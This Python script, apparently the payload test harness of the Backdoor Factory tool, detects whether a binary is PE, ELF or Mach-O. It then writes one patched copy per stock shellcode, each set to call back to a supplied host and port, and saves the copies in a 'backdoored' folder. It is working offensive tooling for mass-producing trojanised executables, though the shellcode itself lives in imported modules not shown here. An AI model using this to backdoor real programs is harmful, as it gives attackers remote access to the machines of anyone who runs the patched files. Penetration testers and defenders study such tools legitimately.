#!/usr/bin/env python
'''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import pebin
import machobin
import elfbin
import sys
import os


def basicDiscovery(FILE):
        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe',
                           '\xce\xfa\xed\xfe',
                           ]

        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return "MACHO"
        else:
            'Only support ELF, PE, and MACH-O file formats'
            return None

if __name__ == "__main__":
    '''
    Will create patched binaries for each payload for the type of binary provided.
    Each payload has it's own port number.
    Usage: ./payloadtests.py file 127.0.0.1 8080
    '''
    if len(sys.argv) != 4:
        print "Will create patched binaries for each stock shellcode/payload for the "
        print "type of binary provided. Each payload type has it's own port number."
        print "Usage:" + str(sys.argv[0]) + " binary HOST PORT"
        sys.exit()

    file = sys.argv[1]
    host = sys.argv[2]
    port = int(sys.argv[3])
    outputfiles = {}

    is_supported = basicDiscovery(file)

    if is_supported is "PE":
        patchtypes = ['APPEND', 'JUMP', 'SINGLE']
        supported_file = pebin.pebin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()
        #print supported_file.flItms['avail_shells']
        for aShell in supported_file.flItms['avail_shells']:
            for patchtype in patchtypes:
                if 'cave_miner' in aShell or 'user_supplied' in aShell:
                    continue
                aName = aShell + "." + patchtype + "." + str(host) + "." + str(port) + "." + file
                print "Creating File:", aName
                if patchtype == 'APPEND':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, ADD_SECTION=True)

                elif patchtype == 'JUMP':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, CAVE_JUMPING=True)
                elif patchtype == 'SINGLE':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, CAVE_JUMPING=False)
                result = supported_file.run_this()
                outputfiles[aName] = result

            port += 1

    elif is_supported is "ELF":
        supported_file = elfbin.elfbin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()

        for aShell in supported_file.avail_shells:
            if 'cave_miner' in aShell or 'user_supplied' in aShell:
                continue
            aName = aShell + "." + str(host) + "." + str(port) + "." + file
            print "Creating File:", aName
            supported_file = elfbin.elfbin(FILE=file, OUTPUT=aName,
                                           SHELL=aShell, HOST=host,
                                           PORT=port)
            result = supported_file.run_this()
            outputfiles[aName] = result

            port += 1

    elif is_supported is "MACHO":
        supported_file = machobin.machobin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()

        for aShell in supported_file.avail_shells:
            if 'cave_miner' in aShell or 'user_supplied' in aShell:
                continue
            aName = aShell + "." + str(host) + "." + str(port) + "." + file
            print "Creating File:", aName
            supported_file = machobin.machobin(FILE=file, OUTPUT=aName,
                                               SHELL=aShell, HOST=host,
                                               PORT=port, FAT_PRIORITY='ALL')
            result = supported_file.run_this()
            outputfiles[aName] = result

            port += 1

    print "Successful files are in backdoored:"
    for afile, aresult in outputfiles.iteritems():
        if aresult is True:
            print afile, 'Success'
        else:
            print afile, 'Fail'
            os.remove('backdoored/' + afile)
